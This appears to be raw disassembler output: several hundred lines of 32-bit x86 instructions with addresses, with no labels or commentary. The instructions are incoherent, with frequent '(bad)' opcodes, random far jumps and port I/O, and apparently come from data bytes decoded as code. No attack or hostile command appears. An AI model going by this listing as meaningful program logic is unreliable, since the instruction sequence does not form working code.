  414b58:	scas   eax,DWORD PTR es:[edi]
  414b59:	pop    esp
  414b5a:	(bad)  
  414b5c:	ds cmp al,0xed
  414b5f:	iret   
  414b60:	shr    esp,cl
  414b62:	dec    eax
  414b63:	cdq    
  414b64:	js     0x414b6b
  414b66:	lds    ebx,FWORD PTR [edx-0x58f27ef0]
  414b6c:	(bad)  
  414b6e:	inc    edi
  414b6f:	cmc    
  414b70:	xchg   edi,eax
  414b71:	cmp    al,0xf8
  414b73:	daa    
  414b74:	scas   al,BYTE PTR es:[edi]
  414b75:	mov    cl,0x98
  414b77:	jae    0x414b8c
  414b79:	adc    ah,BYTE PTR [edi+0x1aa04358]
  414b7f:	mov    ch,0x87
  414b81:	fidiv  WORD PTR [ebp-0x32]
  414b84:	dec    ecx
  414b85:	mov    ecx,0xdf928750
  414b8a:	dec    edx
  414b8b:	xchg   ebx,eax
  414b8c:	mov    ebp,0x32ce1f9
  414b91:	fs pop ds
  414b93:	mov    ebp,0x42fa072b
  414b98:	push   eax
  414b99:	or     ah,BYTE PTR [ecx+0x73df1992]
  414b9f:	retf   
  414ba0:	stc    
  414ba1:	sbb    edx,DWORD PTR [eax+0x17]
  414ba4:	inc    edx
  414ba5:	mov    eax,0x249b9857
  414baa:	das    
  414bab:	stos   BYTE PTR es:[edi],al
  414bac:	fsubr  QWORD PTR [ecx-0x2ddf068]
  414bb2:	scas   eax,DWORD PTR es:[edi]
  414bb3:	(bad)  
  414bb4:	retf   
  414bb5:	out    dx,al
  414bb6:	neg    DWORD PTR [edx]
  414bb8:	sahf   
  414bb9:	cwde   
  414bba:	mov    ah,0xc3
  414bbc:	fbstp  TBYTE PTR [edx-0x70ff59be]
  414bc2:	push   edx
  414bc3:	lea    ebp,[esi-0x5]
  414bc6:	hlt    
  414bc7:	xchg   edi,eax
  414bc8:	stc    
  414bc9:	inc    eax
  414bca:	mov    ecx,0x48994631
  414bcf:	cdq    
  414bd0:	cmp    eax,0xa153c087
  414bd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bd6:	sti    
  414bd7:	mov    eax,0xc4f43b4
  414bdc:	cwde   
  414bdd:	xor    eax,0x1216269f
  414be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414be3:	call   0xc78:0x81d17f8a
  414bea:	pop    es
  414beb:	mov    ch,BYTE PTR [ebx+0x349f211c]
  414bf1:	pop    ss
  414bf2:	inc    esi
  414bf3:	outs   dx,DWORD PTR ds:[esi]
  414bf4:	hlt    
  414bf5:	pusha  
  414bf6:	stos   DWORD PTR es:[edi],eax
  414bf7:	stos   DWORD PTR es:[edi],eax
  414bf8:	scas   eax,DWORD PTR es:[edi]
  414bf9:	stos   BYTE PTR es:[edi],al
  414bfa:	scas   al,BYTE PTR es:[edi]
  414bfb:	bound  edx,QWORD PTR [edi+0x4a]
  414bfe:	pop    ebx
  414bff:	jl     0x414c38
  414c01:	daa    
  414c02:	pop    esp
  414c03:	mov    ah,0xd6
  414c05:	pop    edi
  414c06:	pop    ebx
  414c07:	or     al,0x67
  414c09:	aam    0xbd
  414c0b:	jl     0x414c60
  414c0d:	dec    edx
  414c0e:	or     edx,DWORD PTR [edi]
  414c10:	add    dh,cl
  414c12:	ja     0x414c56
  414c14:	jo     0x414bcb
  414c16:	inc    eax
  414c17:	sbb    DWORD PTR ds:0x63968ad3,ecx
  414c1d:	das    
  414c1e:	dec    edx
  414c1f:	push   es
  414c20:	out    dx,eax
  414c21:	mov    dh,0xb1
  414c23:	lods   al,BYTE PTR ds:[esi]
  414c24:	stos   DWORD PTR es:[edi],eax
  414c25:	xor    BYTE PTR [ebx+0x71],al
  414c28:	sbb    BYTE PTR [esi],dh
  414c2a:	test   BYTE PTR [eax],ch
  414c2c:	fidivr DWORD PTR ds:0xa41a9bd7
  414c32:	ins    DWORD PTR es:[edi],dx
  414c33:	pop    esp
  414c34:	lods   al,BYTE PTR ds:[esi]
  414c35:	ror    BYTE PTR [ecx],cl
  414c37:	ror    DWORD PTR [ebp+0x6f307c40],cl
  414c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c3e:	aas    
  414c3f:	inc    esi
  414c40:	adc    DWORD PTR [eax+eiz*2+0x364e1abc],eax
  414c47:	push   edi
  414c48:	sbb    bl,BYTE PTR [ecx]
  414c4a:	xchg   edi,eax
  414c4b:	xchg   BYTE PTR [ebx-0x6d],al
  414c4e:	inc    edx
  414c4f:	imul   esi,DWORD PTR [edx+0x77],0xc05e3b57
  414c56:	fxam   
  414c58:	jae    0x414c0a
  414c5a:	inc    edx
  414c5b:	mov    ebx,0x9b737ff3
  414c60:	gs jno 0x414bf0
  414c63:	dec    ecx
  414c64:	(bad)  
  414c65:	cld    
  414c66:	loope  0x414c65
  414c68:	inc    edx
  414c69:	add    eax,0xb8a9c7a5
  414c6e:	pop    ebp
  414c6f:	mov    eax,ds:0xb1914645
  414c74:	(bad)
  414c77:	xor    ch,ah
  414c79:	cmp    cl,BYTE PTR [edi+0x7350c7e7]
  414c7f:	clc    
  414c80:	js     0x414c91
  414c82:	in     eax,0xc2
  414c84:	(bad)  
  414c85:	cdq    
  414c86:	push   es
  414c87:	stos   DWORD PTR es:[edi],eax
  414c88:	mov    eax,0xf3f26db8
  414c8d:	pop    ebp
  414c8e:	cmp    DWORD PTR [edi],0x10
  414c91:	mov    bl,0x76
  414c93:	xor    al,0x7
  414c95:	ins    BYTE PTR es:[edi],dx
  414c96:	and    BYTE PTR [ebp+0x17055fc2],dh
  414c9c:	mov    edx,0xe6f5e5e4
  414ca1:	push   es
  414ca2:	push   es
  414ca3:	fcmovne st,st(4)
  414ca5:	aas    
  414ca6:	mov    ds:0x21be5f0a,eax
  414cab:	xchg   BYTE PTR [eax],dl
  414cad:	adc    eax,0x2bbc85db
  414cb2:	lods   al,BYTE PTR ds:[esi]
  414cb3:	mov    cl,al
  414cb5:	ret    0x4404
  414cb8:	or     ch,BYTE PTR [ebp-0x2f9a7caa]
  414cbe:	fs pushf 
  414cc0:	fnstcw WORD PTR [ebp+0xb]
  414cc3:	mov    edx,0xc17aa45a
  414cc8:	stos   DWORD PTR es:[edi],eax
  414cc9:	dec    eax
  414cca:	cs push cs
  414ccc:	inc    edx
  414ccd:	or     al,ah
  414ccf:	aad    0xa6
  414cd1:	test   DWORD PTR [edi+0x6cacda04],esi
  414cd7:	pusha  
  414cd8:	nop
  414cd9:	fdiv   DWORD PTR [ebp+0x52]
  414cdc:	cdq    
  414cdd:	aam    0x91
  414cdf:	xchg   edx,eax
  414ce0:	es ins BYTE PTR es:[edi],dx
  414ce2:	inc    ebx
  414ce3:	test   al,0xd6
  414ce5:	pop    ds
  414ce6:	xor    DWORD PTR [ecx+0x438bf967],ebp
  414cec:	aad    0xda
  414cee:	cmp    bl,BYTE PTR [ecx+0x6ca32b5b]
  414cf4:	cmc    
  414cf5:	(bad)  
  414cf6:	ret    
  414cf7:	test   BYTE PTR [ebx],0x53
  414cfa:	mov    bl,0x50
  414cfc:	and    BYTE PTR [edi],dl
  414cfe:	into   
  414cff:	nop
  414d00:	mov    DWORD PTR [esi],esi
  414d02:	popa   
  414d03:	xor    DWORD PTR [edx-0x51],esp
  414d06:	fisub  WORD PTR [ebp-0x50]
  414d09:	sar    DWORD PTR [edi-0x51],0x61
  414d0d:	das    
  414d0e:	pop    ecx
  414d0f:	hlt    
  414d10:	les    ebx,FWORD PTR es:[edx-0x21efc373]
  414d17:	rol    DWORD PTR [ecx-0x76806de2],0x93
  414d1e:	and    bl,BYTE PTR [ebp+0xb44cfe7]
  414d24:	add    eax,0xb86d3f4a
  414d29:	dec    esp
  414d2a:	lock sbb eax,0x67f15cf6
  414d30:	fldenv [edi]
  414d32:	out    dx,eax
  414d33:	pop    ebp
  414d34:	test   BYTE PTR [eax-0x744b926c],dl
  414d3a:	scas   eax,DWORD PTR es:[edi]
  414d3b:	or     DWORD PTR [ebp-0x2ef950b1],eax
  414d41:	adc    dh,al
  414d43:	lahf   
  414d44:	out    0xc2,eax
  414d46:	xchg   esp,eax
  414d47:	fisttp WORD PTR [ebx-0x6d8423b6]
  414d4d:	aas    
  414d4e:	jmp    0x9787:0xa492fda
  414d55:	or     BYTE PTR [edx-0x37ee67ad],0x1d
  414d5c:	xor    BYTE PTR [edi+0x526fdaf7],ch
  414d62:	xchg   DWORD PTR [edx-0x1c9670c3],ebx
  414d68:	jg     0x414db7
  414d6a:	jns    0x414d3d
  414d6c:	gs (bad) 
  414d6e:	mov    edi,0x614c4ab1
  414d73:	cld    
  414d74:	maxps  xmm6,XMMWORD PTR [esi+0x224be417]
  414d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d7c:	imul   eax,edx,0xf0d757e5
  414d82:	inc    edx
  414d83:	outs   dx,BYTE PTR ds:[esi]
  414d84:	jno    0x414dfd
  414d86:	dec    ebp
  414d87:	dec    esp
  414d88:	or     dl,BYTE PTR [ecx]
  414d8a:	sub    DWORD PTR [esp+esi*8+0x4a4b4831],eax
  414d91:	and    al,BYTE PTR [edi+edx*1]
  414d94:	mov    bh,0xfa
  414d96:	lock frstor [edx+0x51]
  414d9a:	ins    DWORD PTR es:[edi],dx
  414d9b:	mov    esp,0x3a95aa74
  414da0:	mov    ebp,0x2ece36a2
  414da5:	rcl    cl,cl
  414da7:	enter  0xb740,0x35
  414dab:	and    edx,esp
  414dad:	int    0x21
  414daf:	inc    edi
  414db0:	call   0x6155:0xb13fad1
  414db7:	mov    al,ds:0xdfc85198
  414dbc:	sub    eax,0xc21120a2
  414dc1:	xchg   BYTE PTR [esi+0x4980ee48],dl
  414dc7:	mov    ebx,0x809879fb
  414dcc:	(bad)  
  414dcd:	popa   
  414dce:	aad    0x36
  414dd0:	push   ecx
  414dd1:	dec    ecx
  414dd2:	sub    al,0x43
  414dd4:	icebp  
  414dd5:	adc    BYTE PTR [edx+0x7cca3fc7],bl
  414ddb:	hlt    
  414ddc:	sbb    cl,al
  414dde:	or     BYTE PTR [ecx+0x27],dh
  414de1:	jle    0x414d7e
  414de3:	bound  ecx,QWORD PTR [eax+eiz*4-0x43]
  414de7:	out    0x91,al
  414de9:	scas   al,BYTE PTR es:[edi]
  414dea:	inc    ebx
  414deb:	scas   al,BYTE PTR es:[edi]
  414dec:	xor    ecx,ebp
  414dee:	ja     0x414e3d
  414df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414df1:	pop    ebp
  414df2:	in     eax,dx
  414df3:	mov    al,0x8c
  414df5:	cld    
  414df6:	adc    bh,0x96
  414df9:	fwait
  414dfa:	sub    esp,DWORD PTR [esi+0x58965ac7]
  414e00:	aad    0xec
  414e02:	sub    ebp,DWORD PTR [esi-0x726de267]
  414e08:	mov    al,ds:0x1f42ef8e
  414e0d:	pop    edx
  414e0e:	jb     0x414dfd
  414e10:	out    dx,al
  414e11:	dec    ebp
  414e12:	inc    ecx
  414e13:	mov    esp,0x25f04089
  414e18:	punpckldq mm7,mm4
  414e1b:	stc    
  414e1c:	pusha  
  414e1d:	push   ebp
  414e1e:	xchg   esi,eax
  414e1f:	outs   dx,DWORD PTR ds:[esi]
  414e20:	xchg   edi,eax
  414e21:	neg    edi
  414e23:	ja     0x414e31
  414e25:	mov    ebx,0x11957c42
  414e2a:	mov    bh,0xac
  414e2c:	push   es
  414e2d:	or     BYTE PTR [ecx+0x2ae17a37],dl
  414e33:	cmp    esi,DWORD PTR [ebx-0x6dd67225]
  414e39:	adc    eax,0xa4cb2a25
  414e3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e3f:	out    0xac,eax
  414e41:	mov    dh,0x4e
  414e43:	mov    ebx,0xab5d7c6b
  414e49:	adc    eax,0x9059709a
  414e4e:	loop   0x414e2e
  414e50:	in     eax,dx
  414e51:	(bad)  
  414e52:	cmc    
  414e53:	cmp    eax,0x72c15447
  414e58:	(bad)  
  414e59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e5a:	ss mov esp,0xccb493e5
  414e60:	adc    dh,dh
  414e62:	xchg   cl,bh
  414e64:	mov    DWORD PTR [edx+ecx*8],0xf459cb1b
  414e6b:	mov    ah,0x42
  414e6d:	fmul   DWORD PTR [edi+eiz*8-0x68c315a2]
  414e74:	mov    ebp,0xc12f082d
  414e79:	jmp    0x414e15
  414e7b:	int3   
  414e7c:	mov    es,edx
  414e7e:	lds    ebp,FWORD PTR ds:0x2f481bc4
  414e84:	in     al,dx
  414e85:	shl    bl,cl
  414e87:	jle    0x414e2e
  414e89:	ret    0xcd8e
  414e8c:	out    dx,eax
  414e8d:	add    BYTE PTR ds:0xe0f150d7,0x4c
  414e94:	loope  0x414e1a
  414e96:	jne    0x414e86
  414e98:	mov    ecx,0xab997a49
  414e9d:	cmovns eax,DWORD PTR [edx]
  414ea0:	xchg   ecx,eax
  414ea1:	sti    
  414ea2:	cwde   
  414ea3:	es (bad) 
  414ea6:	dec    esp
  414ea7:	daa    
  414ea8:	retf   0x1d6c
  414eab:	lea    esi,[esi+0x77c51887]
  414eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414eb2:	out    dx,al
  414eb3:	cdq    
  414eb4:	stos   BYTE PTR es:[edi],al
  414eb5:	nop
  414eb6:	sahf   
  414eb7:	aad    0xfd
  414eb9:	mov    esi,0x3d97868b
  414ebe:	imul   edi,DWORD PTR [edi-0x45430cce],0xffffff97
  414ec5:	xchg   ebx,eax
  414ec6:	xchg   esp,eax
  414ec7:	cmp    BYTE PTR [edx],ah
  414ec9:	(bad)  
  414ecb:	add    eax,0xd8c64a89
  414ed0:	xor    ebx,DWORD PTR [ecx+esi*4+0xc397436]
  414ed7:	retf   
  414ed8:	icebp  
  414ed9:	aas    
  414eda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414edb:	ins    DWORD PTR es:[di],dx
  414edd:	imul   ecx,DWORD PTR [ebx-0x57ee840e],0xffffffa7
  414ee4:	das    
  414ee5:	mov    cs,WORD PTR [ebp-0x51]
  414ee8:	lods   al,BYTE PTR fs:[esi]
  414eea:	pop    eax
  414eeb:	mov    edi,0x3af1503b
  414ef0:	(bad)  
  414ef1:	sub    ch,BYTE PTR [ebx]
  414ef3:	sub    ebx,ecx
  414ef5:	jns    0x414e87
  414ef7:	and    al,0xa3
  414ef9:	pop    edx
  414efa:	(bad)  
  414efc:	jmp    0x3e5315a1
  414f01:	jl     0x414e8c
  414f03:	mov    ch,0x41
  414f05:	mov    al,bh
  414f07:	out    0xc5,eax
  414f09:	cmp    ah,dh
  414f0b:	out    0xf3,al
  414f0d:	imul   DWORD PTR [ebp+0x3650c8a2]
  414f13:	jecxz  0x414f3b
  414f15:	ins    BYTE PTR es:[edi],dx
  414f16:	out    dx,al
  414f17:	repz fld DWORD PTR [ecx+0x2]
  414f1b:	or     DWORD PTR [eax],esp
  414f1d:	mov    edx,0x99e5799c
  414f22:	and    eax,0x7c86f08e
  414f27:	rol    BYTE PTR [ecx-0x6e],0xc8
  414f2b:	and    BYTE PTR [edx-0x51b3254],0xdd
  414f32:	adc    dh,BYTE PTR [eax-0x34]
  414f35:	push   eax
  414f36:	jle    0x414f9d
  414f38:	or     BYTE PTR [edx],0x31
  414f3b:	push   esi
  414f3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f3d:	push   esp
  414f3e:	push   esp
  414f3f:	into   
  414f40:	jg     0x414f40
  414f42:	add    esp,DWORD PTR [ebx+0x43]
  414f45:	inc    esi
  414f46:	cli    
  414f47:	shl    BYTE PTR [ebp+0x2a],cl
  414f4a:	inc    ecx
  414f4b:	pop    esp
  414f4c:	xchg   ecx,eax
  414f4d:	or     BYTE PTR [ebp+0x1e33a050],cl
  414f53:	retf   0x60f9
  414f56:	cwde   
  414f57:	ss in  al,0x96
  414f5a:	jne    0x414f9e
  414f5c:	popf   
  414f5d:	loope  0x414fcb
  414f5f:	inc    edi
  414f60:	sbb    DWORD PTR [ebp-0x5332346c],ebx
  414f66:	cld    
  414f67:	add    ah,ch
  414f69:	jmp    0xb96ed2a7
  414f6e:	popa   
  414f6f:	mov    ch,0xb0
  414f71:	stos   DWORD PTR es:[edi],eax
  414f72:	ret    0xfa47
  414f75:	bound  edx,QWORD PTR [edx+0xc1cdd17]
  414f7b:	lea    ebp,[edx+0x35]
  414f7e:	hlt    
  414f7f:	arpl   dx,si
  414f81:	into   
  414f82:	or     eax,0xcf5fbb16
  414f87:	(bad)  
  414f88:	stos   DWORD PTR es:[edi],eax
  414f89:	pop    esp
  414f8a:	hlt    
  414f8b:	daa    
  414f8c:	inc    eax
  414f8d:	lods   al,BYTE PTR ds:[esi]
  414f8e:	mov    ds:0x23e681d7,al
  414f93:	add    DWORD PTR [bx+si+0x5a31],esp
  414f98:	dec    ebx
  414f99:	adc    al,0x44
  414f9b:	sbb    DWORD PTR [esi],edi
  414f9d:	mov    cl,0xce
  414f9f:	sbb    al,0x19
  414fa1:	ja     0x414f89
  414fa3:	mov    ebx,eax
  414fa5:	sub    BYTE PTR [edx+edi*1+0x5d00f185],0x29
  414fad:	imul   esp,DWORD PTR [esi-0x3cbcd938],0x49
  414fb4:	add    DWORD PTR [eax],ecx
  414fb6:	and    al,0x1c
  414fb8:	icebp  
  414fb9:	fwait
  414fba:	int3   
  414fbb:	push   esp
  414fbc:	jecxz  0x414f3f
  414fbe:	loopne 0x41502a
  414fc0:	call   0x7409a92c
  414fc5:	sbb    DWORD PTR [ecx+eax*2],esi
  414fc8:	pop    esi
  414fc9:	out    dx,eax
  414fca:	mov    al,0x8
  414fcc:	adc    BYTE PTR [esi],0x6b
  414fcf:	loopne 0x414fc2
  414fd1:	xor    BYTE PTR [ebx-0x7a],bh
  414fd4:	test   DWORD PTR [ebx],edi
  414fd6:	clc    
  414fd7:	dec    edx
  414fd8:	out    0x8d,eax
  414fda:	push   ecx
  414fdb:	push   ss
  414fdc:	sbb    al,0xdd
  414fde:	inc    esp
  414fdf:	or     DWORD PTR [ebx-0x5e],ebx
  414fe2:	aaa    
  414fe3:	aaa    
  414fe4:	pop    esp
  414fe5:	jne    0x414fe0
  414fe7:	lahf   
  414fe8:	bound  esp,QWORD PTR [edx-0x66]
  414feb:	out    0x90,eax
  414fed:	sub    al,0x6b
  414fef:	cld    
  414ff0:	push   esi
  414ff1:	jb     0x414fbc
  414ff3:	xchg   esi,eax
  414ff4:	jp     0x414fdd
  414ff6:	ja     0x414f8c
  414ff8:	dec    edx
  414ff9:	pop    ebx
  414ffa:	cmc    
  414ffb:	sbb    DWORD PTR [ebx-0x41bccdae],ebx
  415001:	loop   0x414fbd
  415003:	repz sbb eax,DWORD PTR [ebx+ecx*4+0x590da4b2]
  41500b:	cmc    
  41500c:	imul   DWORD PTR [ebp-0x16]
  41500f:	js     0x415059
  415011:	movaps XMMWORD PTR [ebx+0x1b3e3ec8],xmm0
  415018:	push   edx
  415019:	in     eax,0x4f
  41501b:	imul   ebp,DWORD PTR [ecx+0x5],0xffffff86
  41501f:	pop    ecx
  415020:	pop    ebp
  415021:	adc    ah,dh
  415023:	shl    BYTE PTR [esi-0x6f],1
  415026:	mov    ebp,0xf063d13c
  41502b:	dec    ebp
  41502c:	add    BYTE PTR [ecx-0x2cdbffae],ah
  415032:	stc    
  415033:	mov    eax,DWORD PTR [edi-0xb]
  415036:	fs ins BYTE PTR es:[edi],dx
  415038:	shl    DWORD PTR ds:0x9862cffd,cl
  41503e:	mov    fs,ecx
  415040:	dec    esp
  415041:	aad    0x3f
  415043:	jmp    0x415000
  415045:	mov    DWORD PTR [edx],edi
  415047:	and    al,0x3e
  415049:	out    dx,eax
  41504a:	iret   
  41504b:	mov    BYTE PTR [ebx-0x46e08ff3],0xdd
  415052:	or     dh,BYTE PTR [edi]
  415054:	mov    eax,ds:0xc8345b7b
  415059:	repnz (bad) 
  41505b:	hlt    
  41505c:	sub    al,0x5b
  41505e:	rol    eax,cl
  415060:	pop    esp
  415061:	push   ebp
  415062:	ds enter 0x2abb,0xe2
  415067:	retf   
  415068:	xchg   edx,eax
  415069:	mov    dh,0x7c
  41506b:	shr    edi,1
  41506d:	add    eax,0x62fbc2ae
  415072:	mov    dl,0x50
  415074:	mov    WORD PTR [eax+0x39],es
  415077:	dec    BYTE PTR [ecx-0x72]
  41507a:	stos   DWORD PTR es:[edi],eax
  41507b:	mov    dh,0x42
  41507d:	mov    cl,0xd
  41507f:	mov    dh,0x1b
  415081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415082:	sub    DWORD PTR [esp+ebp*1+0x517d5b77],0xc01ea418
  41508d:	pushf  
  41508e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41508f:	popa   
  415090:	scas   al,BYTE PTR es:[edi]
  415091:	dec    edi
  415092:	or     eax,0xad2c0beb
  415097:	add    eax,0x62507864
  41509c:	out    0x67,eax
  41509e:	ret    0x1159
  4150a1:	cmp    al,BYTE PTR [esi+0x474df51]
  4150a7:	(bad)  
  4150a8:	out    dx,eax
  4150a9:	or     eax,DWORD PTR [edi+0x21024f13]
  4150af:	out    0x70,al
  4150b1:	call   0x3e6dba7a
  4150b6:	mov    esi,0xc8b3958
  4150bb:	jmp    0xacb2:0xbedf335e
  4150c2:	mov    al,0x69
  4150c4:	push   ss
  4150c5:	xchg   di,ax
  4150c7:	add    esp,edx
  4150c9:	stos   DWORD PTR es:[edi],eax
  4150ca:	ja     0x41512d
  4150cc:	sub    bl,bh
  4150ce:	test   al,0x11
  4150d0:	jp     0x4150fc
  4150d2:	mov    bl,0x5a
  4150d4:	call   0xb021d328
  4150d9:	lds    esi,FWORD PTR [edx-0x1e]
  4150dc:	imul   edi,DWORD PTR [ecx+eiz*4],0x2217c762
  4150e3:	or     BYTE PTR [esi],0xc5
  4150e6:	mov    ds:0xdea4e216,eax
  4150eb:	out    dx,al
  4150ec:	push   ecx
  4150ed:	xchg   esp,eax
  4150ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150ef:	xor    DWORD PTR [edx],0x88eb440
  4150f5:	mov    edx,0xc0afb7e8
  4150fa:	and    dh,dh
  4150fc:	es add eax,0x2c349841
  415102:	xchg   esi,eax
  415103:	pop    ebx
  415104:	clc    
  415105:	fld    DWORD PTR gs:[edx+eax*1-0x52]
  41510a:	push   eax
  41510b:	rcr    dl,1
  41510d:	pop    esi
  41510e:	mov    esp,0x5a4db3ce
  415113:	aaa    
  415114:	xor    dl,ah
  415116:	push   edx
  415117:	mov    dh,0x52
  415119:	repnz outs dx,BYTE PTR ds:[esi]
  41511b:	mov    edx,0x90ca6d0
  415120:	mov    ebx,0x11d3f6d4
  415125:	je     0x4150c4
  415127:	aad    0xd9
  415129:	sub    cl,BYTE PTR [edi+0x636b7430]
  41512f:	cmp    BYTE PTR ds:0x496a2067,0xb3
  415136:	fst    DWORD PTR [eax-0x72]
  415139:	loope  0x4150ee
  41513b:	xlat   BYTE PTR ds:[ebx]
  41513c:	push   esp
  41513d:	scas   eax,DWORD PTR es:[edi]
  41513e:	jl     0x4151b4
  415140:	outs   dx,DWORD PTR ds:[esi]
  415141:	leave  
  415142:	aaa    
  415143:	jb     0x41512f
  415145:	adc    cl,al
  415147:	xchg   edx,eax
  415148:	mov    ch,ch
  41514a:	imul   eax
  41514c:	sbb    ecx,ebp
  41514e:	xchg   edi,eax
  41514f:	jo     0x4150e1
  415151:	inc    edx
  415152:	cmp    ecx,ebx
  415154:	les    esi,FWORD PTR [ebx+0x4f]
  415157:	fiadd  WORD PTR [eax+0x598ea14c]
  41515d:	mov    fs,WORD PTR [esi+ebp*4-0x43]
  415161:	mov    dh,0x60
  415163:	mov    al,0xd8
  415165:	imul   edi,DWORD PTR [ecx-0x13],0xfffffff7
  415169:	ficom  WORD PTR [esi]
  41516b:	xchg   ecx,eax
  41516c:	in     al,0xad
  41516e:	mov    es,eax
  415170:	add    eax,0x63c3f459
  415175:	inc    esp
  415176:	sahf   
  415177:	xchg   dx,ax
  415179:	ret    0x8b3
  41517c:	lds    ecx,FWORD PTR [esi]
  41517e:	loopne 0x415198
  415180:	push   eax
  415181:	pushf  
  415182:	xchg   edx,eax
  415183:	mov    ebx,0xc2df0bf6
  415188:	in     al,dx
  415189:	add    eax,DWORD PTR [eax-0x38a682e9]
  41518f:	inc    DWORD PTR [ecx]
  415191:	mov    ebx,0xca4e990b
  415196:	pop    ss
  415197:	cwde   
  415198:	dec    ecx
  415199:	xlat   BYTE PTR ds:[ebx]
  41519a:	dec    esi
  41519b:	mov    ebp,0x19ff96bc
  4151a0:	dec    ecx
  4151a1:	jb     0x41512e
  4151a3:	adc    bl,dl
  4151a5:	push   es
  4151a6:	jno    0x415155
  4151a8:	mov    eax,ds:0x79ff2c7b
  4151ad:	and    eax,ebx
  4151af:	(bad)  
  4151b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151b2:	jns    0x41516a
  4151b4:	cmp    edx,DWORD PTR [ecx]
  4151b6:	mov    dl,0x1a
  4151b8:	daa    
  4151b9:	dec    esp
  4151ba:	add    DWORD PTR [ebx],ebp
  4151bc:	jl     0x415205
  4151be:	fmul   QWORD PTR [edx]
  4151c0:	add    esp,DWORD PTR [edi]
  4151c2:	fldl2t 
  4151c4:	dec    ebp
  4151c5:	pop    DWORD PTR [esi+0x2a]
  4151c8:	in     al,0x56
  4151ca:	xchg   ebx,eax
  4151cb:	mov    DWORD PTR [edi+eax*2+0x472f41ab],eax
  4151d2:	xchg   esi,eax
  4151d3:	shr    BYTE PTR ds:0x140d830c,0x45
  4151da:	inc    ebx
  4151db:	xor    eax,0x2eb8694e
  4151e0:	push   ebp
  4151e1:	pop    esi
  4151e2:	pop    ebp
  4151e3:	cwde   
  4151e4:	(bad)  
  4151e5:	mov    eax,ds:0x97ee5b0c
  4151ea:	(bad)  
  4151eb:	daa    
  4151ec:	push   edx
  4151ed:	xor    dh,BYTE PTR [bx+di]
  4151f0:	add    al,0xcc
  4151f2:	and    DWORD PTR [ebp-0x3a0bdf97],esi
  4151f8:	loope  0x41517e
  4151fa:	scas   eax,DWORD PTR es:[edi]
  4151fb:	xchg   edx,eax
  4151fc:	inc    ecx
  4151fd:	and    al,BYTE PTR [edi]
  4151ff:	mov    ah,0x7a
  415201:	ss inc ecx
  415203:	xchg   edi,eax
  415204:	mov    WORD PTR [edi],gs
  415206:	mov    ds:0xc5b96c14,eax
  41520b:	rcr    edx,1
  41520d:	lea    ebp,[edx+0x13]
  415210:	dec    eax
  415211:	mov    WORD PTR [eax+0xc],ss
  415214:	out    dx,al
  415215:	repz cdq 
  415217:	or     edx,DWORD PTR [eax]
  415219:	push   edi
  41521a:	das    
  41521b:	lds    eax,FWORD PTR [ecx]
  41521d:	hlt    
  41521e:	aaa    
  41521f:	rcl    BYTE PTR [ecx],0x57
  415222:	(bad)  
  415224:	inc    esp
  415225:	inc    eax
  415226:	cdq    
  415227:	xchg   DWORD PTR [ebp-0x733154df],esp
  41522d:	push   0xffffff94
  41522f:	dec    edx
  415230:	adc    eax,0xc272654d
  415235:	lea    ebx,[eax-0x59b0c4db]
  41523b:	retf   0x27a9
  41523e:	pop    eax
  41523f:	adc    DWORD PTR [edi-0x4f],0x2a
  415243:	jecxz  0x415298
  415245:	or     dh,dl
  415247:	xor    BYTE PTR [ebx-0x4d],ch
  41524a:	xchg   ebp,eax
  41524b:	(bad)  
  41524c:	xchg   edi,eax
  41524d:	loopne 0x415271
  41524f:	dec    eax
  415250:	sahf   
  415251:	xchg   ebp,eax
  415252:	pop    ebp
  415253:	jmp    0x41526a
  415255:	jne    0x415250
  415257:	data16 std 
  415259:	adc    bl,BYTE PTR [esi-0x7e]
  41525c:	and    dl,BYTE PTR [ebx-0x5d3599fe]
  415262:	pusha  
  415263:	cmp    esp,edi
  415265:	mov    edi,0x60a755f9
  41526a:	push   DWORD PTR [edx+ebx*1+0x53c6bb2f]
  415271:	jo     0x4152e7
  415273:	retf   0x37fb
  415276:	aaa    
  415277:	mov    WORD PTR [ebp-0x16],ss
  41527a:	cmp    eax,0x85c79036
  41527f:	and    dh,0x85
  415282:	xor    DWORD PTR [esi],esp
  415284:	or     BYTE PTR [edx+0x6e],al
  415287:	pop    es
  415288:	inc    ebx
  415289:	cmp    eax,0x8be1505
  41528e:	dec    esp
  41528f:	push   edi
  415290:	sbb    edi,edi
  415292:	loope  0x4152ed
  415294:	add    eax,0x247cc137
  415299:	out    dx,al
  41529a:	rcl    BYTE PTR [edi-0x24],1
  41529d:	or     eax,0xd44e47de
  4152a2:	sub    DWORD PTR [ebp+0x449d7518],eax
  4152a8:	jnp    0x415295
  4152aa:	mov    ecx,0x66b3b396
  4152af:	loop   0x415309
  4152b1:	scas   eax,DWORD PTR es:[edi]
  4152b2:	shl    DWORD PTR [esi],cl
  4152b4:	pop    ss
  4152b5:	das    
  4152b6:	mov    eax,0x7f44f2ca
  4152bb:	cli    
  4152bc:	(bad)  
  4152bd:	clc    
  4152be:	bound  ebp,QWORD PTR [edx+0x33]
  4152c1:	arpl   WORD PTR fs:[esi],dx
  4152c4:	cmp    DWORD PTR ds:0xc5c75525,esp
  4152ca:	fcmovu st,st(5)
  4152cc:	or     esp,DWORD PTR [edx]
  4152ce:	js     0x415324
  4152d0:	pushf  
  4152d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152d2:	dec    ecx
  4152d3:	clc    
  4152d4:	mov    ch,0x21
  4152d6:	adc    DWORD PTR [eax+0x2943123a],ebp
  4152dc:	inc    esp
  4152dd:	jbe    0x4152b1
  4152df:	clc    
  4152e0:	mov    ds:0xb1b5c919,al
  4152e5:	push   cs
